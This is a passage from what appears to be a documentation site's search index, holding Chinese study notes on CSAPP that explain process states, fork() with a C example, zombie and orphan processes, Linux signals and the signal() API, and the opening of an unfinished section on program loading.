\u4fe1\u53f7\u65f6\uff0c\u8fdb\u7a0b\u5c31\u505c\u6b62\uff0c\u5e76\u4e14\u4fdd\u6301\u505c\u6b62\u76f4\u5230\u5b83\u6536\u5230\u4e00\u4e2a   SIGCONT \u4fe1\u53f7\uff0c\u5728\u8fd9\u4e2a\u65f6\u523b\uff0c\u8fdb\u7a0b\u518d\u6b21\u5f00\u59cb\u8fd0\u884c\u3002\uff08\u4fe1\u53f7\u662f\u4e00\u79cd\u8f6f\u4ef6\u4e2d\u65ad\u7684\u5f62\u5f0f\uff0c\u5c06\u5728 8.5 \u8282\u4e2d\u8be6\u7ec6\u63cf\u8ff0\u3002\uff09</li> <li>\u7ec8\u6b62\u3002 \u8fdb\u7a0b\u6c38\u8fdc\u5730\u505c\u6b62\u4e86\u3002\u8fdb\u7a0b\u4f1a\u56e0\u4e3a\u4e09\u79cd\u539f\u56e0\u7ec8\u6b62\uff1a<ul> <li>\u6536\u5230\u4e00\u4e2a\u4fe1\u53f7\uff0c\u8be5\u4fe1\u53f7\u7684\u9ed8\u8ba4\u884c\u4e3a\u662f\u7ec8\u6b62\u8fdb\u7a0b\uff1b</li> <li>\u4ece\u4e3b\u7a0b\u5e8f\u8fd4\u56de\uff1b</li> <li>\u8c03\u7528 exit \u51fd\u6570\u3002</li> </ul> </li> </ul> <p>\u7236\u8fdb\u7a0b\u901a\u8fc7\u8c03\u7528 fork \u51fd\u6570\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u8fd0\u884c\u7684\u5b50\u8fdb\u7a0b\u3002</p> <ul> <li>\u65b0\u521b\u5efa\u7684\u5b50\u8fdb\u7a0b\u51e0\u4e4e\u4e0e\u7236\u8fdb\u7a0b\u76f8\u540c\uff1a<ul> <li>\u5b50\u8fdb\u7a0b\u5f97\u5230\u4e0e\u7236\u8fdb\u7a0b\u7528\u6237\u7ea7\u865a\u62df\u5730\u5740\u7a7a\u95f4\u76f8\u540c\u7684\uff08\u4f46\u662f\u72ec\u7acb\u7684\uff09\u4e00\u4efd\u526f\u672c\uff0c\u5305\u62ec\u4ee3\u7801\u548c\u6570\u636e\u6bb5\u3001\u5806\u3001\u5171\u4eab\u5e93\u4ee5\u53ca\u7528\u6237\u6808\u3002</li> <li>\u5b50\u8fdb\u7a0b\u8fd8\u83b7\u5f97\u4e0e\u7236\u8fdb\u7a0b\u4efb\u4f55\u6253\u5f00\u6587\u4ef6\u63cf\u8ff0\u7b26\u76f8\u540c\u7684\u526f\u672c\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u5f53\u7236\u8fdb\u7a0b\u8c03\u7528 fork \u65f6\uff0c\u5b50\u8fdb\u7a0b\u53ef\u4ee5\u8bfb\u5199\u7236\u8fdb\u7a0b\u4e2d\u6253\u5f00\u7684\u4efb\u4f55\u6587\u4ef6\u3002</li> </ul> </li> <li>\u7236\u8fdb\u7a0b\u548c\u65b0\u521b\u5efa\u7684\u5b50\u8fdb\u7a0b\u4e4b\u95f4\u6700\u5927\u7684\u533a\u522b\u5728\u4e8e\u5b83\u4eec\u6709\u4e0d\u540c\u7684 PID\u3002</li> </ul> <p>fork \u51fd\u6570\u53ea\u88ab\u8c03\u7528\u4e00\u6b21\uff0c\u5374\u4f1a\u8fd4\u56de\u4e24\u6b21\uff1a</p> <ul> <li>\u4e00\u6b21\u662f\u5728\u8c03\u7528\u8fdb\u7a0b\uff08\u7236\u8fdb\u7a0b\uff09\u4e2d\uff1afork \u8fd4\u56de\u5b50\u8fdb\u7a0b\u7684 PID</li> <li>\u4e00\u6b21\u662f\u5728\u65b0\u521b\u5efa\u7684\u5b50\u8fdb\u7a0b\u4e2d\uff1afork \u8fd4\u56de 0</li> </ul> <p>\u56e0\u4e3a\u5b50\u8fdb\u7a0b\u7684 PID \u603b\u662f\u4e3a\u975e\u96f6\uff0c\u8fd4\u56de\u503c\u5c31\u63d0\u4f9b\u4e00\u4e2a\u660e\u786e\u7684\u65b9\u6cd5\u6765\u5206\u8fa8\u7a0b\u5e8f\u662f\u5728\u7236\u8fdb\u7a0b\u8fd8\u662f\u5728\u5b50\u8fdb\u7a0b\u4e2d\u6267\u884c\u3002</p> <pre><code>1 int main()\n2 {\n3     pid_t pid;\n4     int x = 1;\n\n5     pid = Fork(); /* Fork \u662f\u5bf9 fork \u51fd\u6570\u7684\u5305\u88c5\uff0c\u52a0\u5165\u4e86\u9519\u8bef\u5224\u65ad\uff0c\u662f CSAPP \u4e66\u4e2d\u5b9a\u4e49\u7684\uff0c\u89c1 P512 */\n6     if (pid == 0) { /* Child */\n7         printf(\"child : x=%d\\n\", ++x);\n8         exit(0);\n9     }\n\n      /* Parent */\n10    printf(\"parent: x=%d\\n\", --x);\n11    exit(0);\n}\n</code></pre> <p>\u5f53\u5728 Unix \u7cfb\u7edf\u4e0a\u8fd0\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u65f6\uff0c\u6211\u4eec\u5f97\u5230\u4e0b\u9762\u7684\u7ed3\u679c\uff1a</p> <pre><code>linux&gt; ./fork_example\nparent\uff1ax=0\nchild \uff1ax=2\n</code></pre> <p>\u4e0a\u8ff0\u7a0b\u5e8f\u7684\u8fdb\u7a0b\u56fe\u5982\u4e0b\uff1a</p> <p></p> <p>\u6ce8\u610f\u5230\u7b2c 5 \u884c fork \u51fd\u6570\u8c03\u7528\u540e\uff0c\u4f1a\u65b0\u5efa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u7531\u4e8e\u5b50\u8fdb\u7a0b\u51e0\u4e4e\u662f\u7236\u8fdb\u7a0b\u7684\u590d\u5236\uff0c\u56e0\u6b64\u5b50\u8fdb\u7a0b\u4e5f\u4f1a\u4ece\u7b2c 6 \u884c\u5f00\u59cb\u6267\u884c\u3002</p> <p>\u4ece\u7ed3\u679c\u53ef\u4ee5\u6ce8\u610f\u5230\uff1a</p> <ul> <li>\u8c03\u7528\u4e00\u6b21\uff0c\u8fd4\u56de\u4e24\u6b21\uff1afork \u51fd\u6570\u88ab\u7236\u8fdb\u7a0b\u8c03\u7528\u4e00\u6b21\u4f46\u662f\u8fd4\u56de\u4e24\u6b21\uff0c\u4e00\u6b21\u662f\u8fd4\u56de\u5230\u7236\u8fdb\u7a0b\uff0c\u4e00\u6b21\u662f\u8fd4\u56de\u5230\u65b0\u521b\u5efa\u7684\u5b50\u8fdb\u7a0b\u3002\u5bf9\u4e8e\u53ea\u521b\u5efa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u7684\u7a0b\u5e8f\u6765\u8bf4\uff0c\u8fd9\u8fd8\u662f\u76f8\u5f53\u7b80\u5355\u76f4\u63a5\u7684\u3002\u4f46\u662f\u5177\u6709\u591a\u4e2a   fork \u5b9e\u4f8b\u7684\u7a0b\u5e8f\u53ef\u80fd\u5c31\u4f1a\u4ee4\u4eba\u8ff7\u60d1\uff0c\u9700\u8981\u4ed4\u7ec6\u5730\u63a8\u6572\u4e86\u3002</li> <li>\u5e76\u53d1\u6267\u884c\uff1a\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u662f\u5e76\u53d1\u8fd0\u884c\u7684\u72ec\u7acb\u8fdb\u7a0b\u3002\u5185\u6838\u80fd\u591f\u4ee5\u4efb\u610f\u65b9\u5f0f\u4ea4\u66ff\u6267\u884c\u5b83\u4eec\u7684\u903b\u8f91\u63a7\u5236\u6d41\u4e2d\u7684\u6307\u4ee4\u3002\u5728\u6211\u4eec\u7684\u7cfb\u7edf\u4e0a\u8fd0\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u65f6\uff0c\u7236\u8fdb\u7a0b\u5148\u5b8c\u6210\u5b83\u7684   printf \u8bed\u53e5\uff0c\u7136\u540e\u662f\u5b50\u8fdb\u7a0b\u3002\u7136\u800c\uff0c\u5728\u53e6\u4e00\u4e2a\u7cfb\u7edf\u4e0a\u53ef\u80fd\u6b63\u597d\u76f8\u53cd\u3002\u4e00\u822c\u800c\u8a00\uff0c\u4f5c\u4e3a\u7a0b\u5e8f\u5458\uff0c\u6211\u4eec\u51b3\u4e0d\u80fd\u5bf9\u4e0d\u540c\u8fdb\u7a0b\u4e2d\u6307\u4ee4\u7684\u4ea4\u66ff\u6267\u884c\u505a\u4efb\u4f55\u5047\u8bbe\u3002</li> <li>\u76f8\u540c\u4f46\u662f\u72ec\u7acb\u7684\u5730\u5740\u7a7a\u95f4\uff1a\u5982\u679c\u80fd\u591f\u5728 fork   \u51fd\u6570\u5728\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u4e2d\u8fd4\u56de\u540e\u7acb\u5373\u6682\u505c\u8fd9\u4e24\u4e2a\u8fdb\u7a0b\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u4e24\u4e2a\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u90fd\u662f\u76f8\u540c\u7684\u3002\u6bcf\u4e2a\u8fdb\u7a0b\u6709\u76f8\u540c\u7684\u7528\u6237\u6808\u3001\u76f8\u540c\u7684\u672c\u5730\u53d8\u91cf\u503c\u3001\u76f8\u540c\u7684\u5806\u3001\u76f8\u540c\u7684\u5168\u5c40\u53d8\u91cf\u503c\uff0c\u4ee5\u53ca\u76f8\u540c\u7684\u4ee3\u7801\u3002\u56e0\u6b64\uff0c\u5728\u6211\u4eec\u7684\u793a\u4f8b\u7a0b\u5e8f\u4e2d\uff0c\u5f53   fork \u51fd\u6570\u5728\u7b2c 6 \u884c\u8fd4\u56de\u65f6\uff0c\u672c\u5730\u53d8\u91cf x \u5728\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u4e2d\u90fd\u4e3a 1\u3002\u7136\u800c\uff0c\u56e0\u4e3a\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u662f\u72ec\u7acb\u7684\u8fdb\u7a0b\uff0c\u5b83\u4eec\u90fd\u6709\u81ea\u5df1\u7684\u79c1\u6709\u5730\u5740\u7a7a\u95f4\u3002\u540e\u9762\uff0c\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u5bf9   x \u6240\u505a\u7684\u4efb\u4f55\u6539\u53d8\u90fd\u662f\u72ec\u7acb\u7684\uff0c\u4e0d\u4f1a\u53cd\u6620\u5728\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u7684\u5185\u5b58\u4e2d\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u5f53\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u8c03\u7528\u5b83\u4eec\u5404\u81ea\u7684 printf \u8bed\u53e5\u65f6\uff0c\u5b83\u4eec\u4e2d\u7684\u53d8\u91cf   x \u4f1a\u6709\u4e0d\u540c\u7684\u503c\u3002</li> <li>\u5171\u4eab\u6587\u4ef6\uff1a\u5f53\u8fd0\u884c\u8fd9\u4e2a\u793a\u4f8b\u7a0b\u5e8f\u65f6\uff0c\u6211\u4eec\u6ce8\u610f\u5230\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u90fd\u628a\u5b83\u4eec\u7684\u8f93\u51fa\u663e\u793a\u5728\u5c4f\u5e55\u4e0a\u3002\u539f\u56e0\u662f\u5b50\u8fdb\u7a0b\u7ee7\u627f\u4e86\u7236\u8fdb\u7a0b\u6240\u6709\u7684\u6253\u5f00\u6587\u4ef6\u3002\u5f53\u7236\u8fdb\u7a0b\u8c03\u7528   fork \u65f6\uff0cstdout \u6587\u4ef6\u662f\u6253\u5f00\u7684\uff0c\u5e76\u6307\u5411\u5c4f\u5e55\u3002\u5b50\u8fdb\u7a0b\u7ee7\u627f\u4e86\u8fd9\u4e2a\u6587\u4ef6\uff0c\u56e0\u6b64\u5b83\u7684\u8f93\u51fa\u4e5f\u662f\u6307\u5411\u5c4f\u5e55\u7684\u3002</li> </ul> <p>\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u7531\u4e8e\u67d0\u79cd\u539f\u56e0\u7ec8\u6b62\u65f6\uff0c\u5185\u6838\u5e76\u4e0d\u662f\u7acb\u5373\u628a\u5b83\u4ece\u7cfb\u7edf\u4e2d\u6e05\u9664\u3002\u76f8\u53cd\uff0c\u8fdb\u7a0b\u88ab\u4fdd\u6301\u5728\u4e00\u79cd\u5df2\u7ec8\u6b62\u7684\u72b6\u6001\u4e2d\uff0c\u76f4\u5230\u88ab\u5b83\u7684\u7236\u8fdb\u7a0b \u56de\u6536 \uff08reaped\uff09\u3002\u5f53\u7236\u8fdb\u7a0b\u56de\u6536\u5df2\u7ec8\u6b62\u7684\u5b50\u8fdb\u7a0b\u65f6\uff0c\u5185\u6838\u5c06\u5b50\u8fdb\u7a0b\u7684\u9000\u51fa\u72b6\u6001\u4f20\u9012\u7ed9\u7236\u8fdb\u7a0b\uff0c\u7136\u540e\u629b\u5f03\u5df2\u7ec8\u6b62\u7684\u8fdb\u7a0b\uff0c\u4ece\u6b64\u65f6\u5f00\u59cb\uff0c\u8be5\u8fdb\u7a0b\u5c31\u4e0d\u5b58\u5728\u4e86\u3002\u4e00\u4e2a\u7ec8\u6b62\u4e86\u4f46\u8fd8\u672a\u88ab\u56de\u6536\u7684\u8fdb\u7a0b\u79f0\u4e3a \u50f5\u6b7b\u8fdb\u7a0b\uff08zombie\uff09\u3002</p> <p>\u5982\u679c\u4e00\u4e2a\u7236\u8fdb\u7a0b\u7ec8\u6b62\u4e86\uff0c\u5185\u6838\u4f1a\u5b89\u6392 init \u8fdb\u7a0b\u6210\u4e3a\u5b83\u7684\u5b64\u513f\u8fdb\u7a0b\u7684\u517b\u7236\u3002init \u8fdb\u7a0b\u7684 PID \u4e3a 1\uff0c\u662f\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u7531\u5185\u6838\u521b\u5efa\u7684\uff0c\u5b83\u4e0d\u4f1a\u7ec8\u6b62\uff0c\u662f\u6240\u6709\u8fdb\u7a0b\u7684\u7956\u5148\u3002\u5982\u679c\u7236\u8fdb\u7a0b\u6ca1\u6709\u56de\u6536\u5b83\u7684\u50f5\u6b7b\u5b50\u8fdb\u7a0b\u5c31\u7ec8\u6b62\u4e86\uff0c\u90a3\u4e48\u5185\u6838\u4f1a\u5b89\u6392 init \u8fdb\u7a0b\u53bb\u56de\u6536\u5b83\u4eec\u3002\u4e0d\u8fc7\uff0c\u957f\u65f6\u95f4\u8fd0\u884c\u7684\u7a0b\u5e8f\uff0c\u6bd4\u5982 shell \u6216\u8005\u670d\u52a1\u5668\uff0c\u603b\u662f\u5e94\u8be5\u56de\u6536\u5b83\u4eec\u7684\u50f5\u6b7b\u5b50\u8fdb\u7a0b\u3002\u5373\u4f7f\u50f5\u6b7b\u5b50\u8fdb\u7a0b\u6ca1\u6709\u8fd0\u884c\uff0c\u5b83\u4eec\u4ecd\u7136\u6d88\u8017\u7cfb\u7edf\u7684\u5185\u5b58\u8d44\u6e90\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_19","title":"\u5e94\u7528\u5c42\uff1a\u4fe1\u53f7","text":"<p>\u5728\u6b64\u4e4b\u524d\uff0c\u6211\u4eec\u77e5\u9053\uff0c\u5f02\u5e38\u4f1a\u5bfc\u81f4\u63a7\u5236\u6d41\u7a81\u53d8\u7684\u51fa\u73b0\uff0c\u5f53\u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u4f1a\u6839\u636e\u5f02\u5e38\u53f7\u8df3\u8f6c\u5230\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u8fdb\u884c\u5904\u7406\uff0c\u5f02\u5e38\u7531\u8f6f\u4ef6\u548c\u786c\u4ef6\u5171\u540c\u5b9e\u73b0\uff1b\u968f\u540e\uff0c\u4ecb\u7ecd\u4e86\u64cd\u4f5c\u7cfb\u7edf\u5229\u7528\u5f02\u5e38\u6765\u652f\u6301\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u5207\u6362\u7684\u5f02\u5e38\u63a7\u5236\u6d41\u6a21\u5f0f\uff08\u4e0d\u592a\u7406\u89e3\uff0c\u4f3c\u4e4e\u5c31\u662f\u4e0a\u4e0b\u6587\u5207\u6362\u4e5f\u4f1a\u5bfc\u81f4\u63a7\u5236\u6d41\u7a81\u53d8\u7684\u610f\u601d\uff09\u3002</p> <p>\u5728\u672c\u8282\uff0c\u5c06\u4ecb\u7ecd\u66f4\u9ad8\u5c42\u7684 \u8f6f\u4ef6\u5f62\u5f0f\u7684\u5f02\u5e38\uff0c\u79f0\u4e3a Linux \u4fe1\u53f7\uff0c\u4fe1\u53f7\u5141\u8bb8\u8fdb\u7a0b\u548c\u5185\u6838\u4e2d\u65ad\u5176\u4ed6\u8fdb\u7a0b\u3002</p> <p>\u4e00\u4e2a \u4fe1\u53f7 \u5c31\u662f\u4e00\u6761\u5c0f\u6d88\u606f\uff0c\u5b83 \u901a\u77e5\u8fdb\u7a0b \u7cfb\u7edf\u4e2d\u53d1\u751f\u4e86\u4e00\u4e2a\u67d0\u79cd\u7c7b\u578b\u7684\u4e8b\u4ef6\u3002</p> <p>\u6bd4\u5982\uff0c\u4e0b\u56fe\u5c55\u793a\u4e86 Linux \u7cfb\u7edf\u4e0a\u652f\u6301\u7684 30 \u79cd\u4e0d\u540c\u7c7b\u578b\u7684\u4fe1\u53f7\uff08\u6b64\u5904\u4ec5\u5c55\u793a\u4e86\u90e8\u5206\uff09</p> \u5e8f\u53f7 \u540d\u79f0 \u9ed8\u8ba4\u884c\u4e3a \u76f8\u5e94\u4e8b\u4ef6 1 SIGHUP \u7ec8\u6b62 \u7ec8\u7aef\u7ebf\u6302\u65ad 2 SIGINT \u7ec8\u6b62 \u6765\u81ea\u952e\u76d8\u7684\u4e2d\u65ad 3 SIGQUIT \u7ec8\u6b62 \u6765\u81ea\u952e\u76d8\u7684\u9000\u51fa 4 SIGILL \u7ec8\u6b62 \u975e\u6cd5\u6307\u4ee4 5 SIGTRAP \u7ec8\u6b62\u5e76\u8f6c\u50a8\u5185\u5b58 \u8ddf\u8e2a\u9677\u9631 8 SIGFPE \u7ec8\u6b62\u5e76\u8f6c\u50a8\u5185\u5b58 \u6d6e\u70b9\u5f02\u5e38 9 SIGKILL \u7ec8\u6b62 \u6740\u6b7b\u7a0b\u5e8f 11 SIGSEGV \u7ec8\u6b62\u5e76\u8f6c\u50a8\u5185\u5b58 \u65e0\u6548\u7684\u5185\u5b58\u5f15\u7528\uff08\u6bb5\u6545\u969c\uff09 13 SIGPIPE \u7ec8\u6b62 \u5411\u4e00\u4e2a\u6ca1\u6709\u8bfb\u7528\u6237\u7684\u7ba1\u9053\u505a\u5199\u64cd\u4f5c 29 SIGIO \u7ec8\u6b62 \u5728\u67d0\u4e2a\u63cf\u8ff0\u7b26\u4e0a\u53ef\u6267\u884c I/O \u64cd\u4f5c 30 SIGPWR \u7ec8\u6b62 \u7535\u6e90\u6545\u969c <p>\u4f4e\u5c42\u7684\u786c\u4ef6\u5f02\u5e38\u662f\u7531\u5185\u6838\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u5904\u7406\u7684\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5bf9\u7528\u6237\u8fdb\u7a0b\u800c\u8a00\u662f\u4e0d\u53ef\u89c1\u7684\u3002</p> <p>\u4fe1\u53f7\u63d0\u4f9b\u4e86\u4e00\u79cd\u673a\u5236\uff0c\u901a\u77e5\u7528\u6237\u8fdb\u7a0b\u53d1\u751f\u4e86\u8fd9\u4e9b\u5f02\u5e38\u3002</p> <ul> <li>\u5982\u679c\u4e00\u4e2a\u8fdb\u7a0b\u8bd5\u56fe\u9664\u4ee5 0\uff0c\u90a3\u4e48\u5185\u6838\u5c31\u53d1\u9001\u7ed9\u5b83\u4e00\u4e2a SIGFPE \u4fe1\u53f7\uff08\u53f7\u7801 8\uff09\u3002</li> <li>\u5982\u679c\u4e00\u4e2a\u8fdb\u7a0b\u6267\u884c\u4e00\u6761\u975e\u6cd5\u6307\u4ee4\uff0c\u90a3\u4e48\u5185\u6838\u5c31\u53d1\u9001\u7ed9\u5b83\u4e00\u4e2a SIGILL \u4fe1\u53f7\uff08\u53f7\u7801 4\uff09\u3002</li> <li>\u5982\u679c\u8fdb\u7a0b\u8fdb\u884c\u975e\u6cd5\u5185\u5b58\u5f15\u7528\uff0c\u5185\u6838\u5c31\u53d1\u9001\u7ed9\u5b83\u4e00\u4e2a SIGSEGV \u4fe1\u53f7\uff08\u53f7\u7801 11\uff09\u3002</li> </ul> <p>\u5176\u4ed6\u4fe1\u53f7\u5bf9\u5e94\u4e8e\u5185\u6838\u6216\u8005\u5176\u4ed6\u7528\u6237\u8fdb\u7a0b\u4e2d\u8f83\u9ad8\u5c42\u7684\u8f6f\u4ef6\u4e8b\u4ef6\u3002\uff1a</p> <ul> <li>\u5982\u679c\u5f53\u8fdb\u7a0b\u5728\u524d\u53f0\u8fd0\u884c\u65f6\uff0c\u4f60\u952e\u5165 Ctrl+C\uff08\u4e5f\u5c31\u662f\u540c\u65f6\u6309\u4e0b Ctrl \u952e\u548c C \u952e\uff09\uff0c\u90a3\u4e48\u5185\u6838\u5c31\u4f1a\u53d1\u9001\u4e00\u4e2a SIGINT \u4fe1\u53f7\uff08\u53f7\u7801   2\uff09\u7ed9\u8fd9\u4e2a\u524d\u53f0\u8fdb\u7a0b\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u8fdb\u7a0b\u3002</li> <li>\u4e00\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u901a\u8fc7\u5411\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u53d1\u9001\u4e00\u4e2a SIGKILL \u4fe1\u53f7\uff08\u53f7\u7801 9\uff09\u5f3a\u5236\u7ec8\u6b62\u5b83\u3002</li> <li>\u5f53\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u7ec8\u6b62\u6216\u8005\u505c\u6b62\u65f6\uff0c\u5185\u6838\u4f1a\u53d1\u9001\u4e00\u4e2a SIGCHLD \u4fe1\u53f7\uff08\u53f7\u7801 17\uff09\u7ed9\u7236\u8fdb\u7a0b\u3002</li> </ul> <p>\u4f20\u9001\u4e00\u4e2a\u4fe1\u53f7\u5230\u76ee\u7684\u8fdb\u7a0b\u662f\u7531\u4e24\u4e2a\u4e0d\u540c\u6b65\u9aa4\u7ec4\u6210\u7684\uff1a</p> <ul> <li> <p>\u53d1\u9001\u4fe1\u53f7\u3002 \u5185\u6838\u901a\u8fc7\u66f4\u65b0\u76ee\u7684\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u4e2d\u7684\u67d0\u4e2a\u72b6\u6001\uff0c\u53d1\u9001\uff08\u9012\u9001\uff09\u4e00\u4e2a\u4fe1\u53f7\u7ed9\u76ee\u7684\u8fdb\u7a0b\u3002\u53d1\u9001\u4fe1\u53f7\u53ef\u4ee5\u6709\u5982\u4e0b\u4e24\u79cd\u539f\u56e0\uff1a</p> <ul> <li>\u5185\u6838\u68c0\u6d4b\u5230\u4e00\u4e2a\u7cfb\u7edf\u4e8b\u4ef6\uff0c\u6bd4\u5982\u9664\u96f6\u9519\u8bef\u6216\u8005\u5b50\u8fdb\u7a0b\u7ec8\u6b62\u3002</li> <li>\u4e00\u4e2a\u8fdb\u7a0b\u8c03\u7528\u4e86 kill \u51fd\u6570\uff0c\u663e\u5f0f\u5730\u8981\u6c42\u5185\u6838\u53d1\u9001\u4e00\u4e2a\u4fe1\u53f7\u7ed9\u76ee\u7684\u8fdb\u7a0b\u3002</li> </ul> </li> </ul> <p>\u4e00\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u53d1\u9001\u4fe1\u53f7\u7ed9\u5b83\u81ea\u5df1\u3002</p> <ul> <li>\u63a5\u6536\u4fe1\u53f7\u3002\u5f53\u76ee\u7684\u8fdb\u7a0b\u88ab\u5185\u6838\u5f3a\u8feb\u4ee5\u67d0\u79cd\u65b9\u5f0f\u5bf9\u4fe1\u53f7\u7684\u53d1\u9001\u505a\u51fa\u53cd\u5e94\u65f6\uff0c\u5b83\u5c31\u63a5\u6536\u4e86\u4fe1\u53f7\u3002\u8fdb\u7a0b\u53ef\u4ee5\u5ffd\u7565\u8fd9\u4e2a\u4fe1\u53f7\uff0c\u7ec8\u6b62\u6216\u8005\u901a\u8fc7\u6267\u884c\u4e00\u4e2a\u79f0\u4e3a\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\uff08signal handler\uff09\u7684\u7528\u6237\u5c42\u51fd\u6570\u6355\u83b7\u8fd9\u4e2a\u4fe1\u53f7\u3002\u56fe 8-27 \u7ed9\u51fa\u4e86\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u6355\u83b7\u4fe1\u53f7\u7684\u57fa\u672c\u601d\u60f3\u3002</li> </ul> <p>\u6ce8\u610f\uff1a\u4fe1\u53f7\u548c\u5f02\u5e38\u7684\u4e3b\u8981\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\uff0c\u5f02\u5e38\u662f\u7531\u5185\u6838\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u5904\u7406\u7684\uff0c\u7528\u6237\u5c42\u65e0\u6cd5\u5e72\u9884\uff0c\u800c\u4fe1\u53f7\u5219\u4e0d\u540c\uff0c\u867d\u7136\u6bcf\u4e2a\u4fe1\u53f7\u7c7b\u578b\u90fd\u6709\u4e00\u4e2a\u9884\u5b9a\u4e49\u7684 \u9ed8\u8ba4\u884c\u4e3a\uff08\u8fdb\u7a0b\u7ec8\u6b62\u3001\u7ec8\u6b62\u5e76\u8f6c\u5b58\u3001\u8fdb\u7a0b\u6302\u8d77\u77e5\u9053\u88ab SIGCONT \u91cd\u542f\u3001\u5ffd\u7565\u4fe1\u53f7\uff09\uff0c\u4f46\u8fdb\u7a0b\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528 signal \u51fd\u6570\u4fee\u6539\u548c\u4fe1\u53f7\u76f8\u5173\u8054\u7684\u9ed8\u8ba4\u884c\u4e3a\u3002</p> <pre><code>#include &lt;signal.h&gt;\ntypedef void (*sighandler_t)(int);\n\nsighandler_t signal(int signum, sighandler_t handler);\n\n// \u8fd4\u56de\uff1a\u82e5\u6210\u529f\u5219\u4e3a\u6307\u5411\u524d\u6b21\u5904\u7406\u7a0b\u5e8f\u7684\u6307\u9488\uff0c\u82e5\u51fa\u9519\u5219\u4e3a SIG_ERR\uff08\u4e0d\u8bbe\u7f6e errno\uff09\u3002\n</code></pre> <p>\u6709\u5173\u8fdb\u7a0b\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u53ef\u67e5\u770b CSAPP 526\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#todo","title":"\u52a0\u8f7d\u4e0e\u6267\u884c(TODO)","text":"<ul> <li>CSAPP P484</li> <li>CSAPP P521 TODO</li> <li>CSAPP P584 TODO</li> </ul> <p>\u76ee\u524d\uff0c\u6211\u4eec\u5df2\u7ecf\u9996\u5148\u4ecb\u7ecd\u4e86\u7a0b\u5e8f\u4ece\u6e90\u4ee3\u7801\u7ecf\u8fc7\u7f16\u8bd1\u4e0e\u6c47\u7f16\u751f\u6210\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u7a0b\u5e8f\uff0c\u53c8\u7ecf\u8fc7\u94fe\u63a5\u5668\u751f\u6210\u4e86\u53ef\u6267\u884c\u76ee\u6807\u7a0b\u5e8f\u3002\u6b64\u5916\uff0c\u8fd8\u77e5\u9053\u4e8c\u8005\u7528 ELF \u683c\u5f0f\u7684\u5177\u4f53\u6587\u4ef6\u7ec4\u7ec7\u60c5\u51b5\uff0c\u672c\u7ae0\u5c06\u4ecb\u7ecd\u53ef\u6267\u884c\u76ee\u6807\u7a0b\u5e8f\u5982\u4f55\u8f7d\u5165\u5185\u5b58\u5e76\u6267\u884c\u7684\u3002</p> <p>\u8981\u8fd0\u884c\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6 <code>a.out</code>\uff0c\u53ea\u9700\u8981\u5728 Linux shell \u7684\u547d\u4ee4\u884c\u4e2d\u8f93\u5165\uff1a</p> <pre><code>./a.out\n</code></pre> <p>\u7531\u4e8e <code>a.out</code> \u4e0d\u662f\u4e00\u4e2a\u5185\u7f6e\u7684 shell \u547d\u4ee4\uff0c\u6240\u4ee5 shell \u4f1a\u8ba4\u4e3a prog \u662f\u4e00\u4e2a\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\uff0c\u901a\u8fc7\u8c03\u7528\u67d0\u4e2a\u9a7b\u7559\u5728\u5b58\u50a8\u5668\u4e2d\u79f0\u4e3a\u52a0\u8f7d\u5668\uff08loader\uff09\u7684\u64cd\u4f5c\u7cfb\u7edf\u4ee3\u7801\u6765\u8fd0\u884c\u5b83\u3002</p> <p>\u4efb\u4f55 Linux \u7a0b\u5e8f\u90fd\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528 execve \u51fd\u6570\u6765\u8c03\u7528\u52a0\u8f7d\u5668 \uff08TODO\uff1a\u8be6\u7ec6\u4ecb\u7ecd\uff09</p> 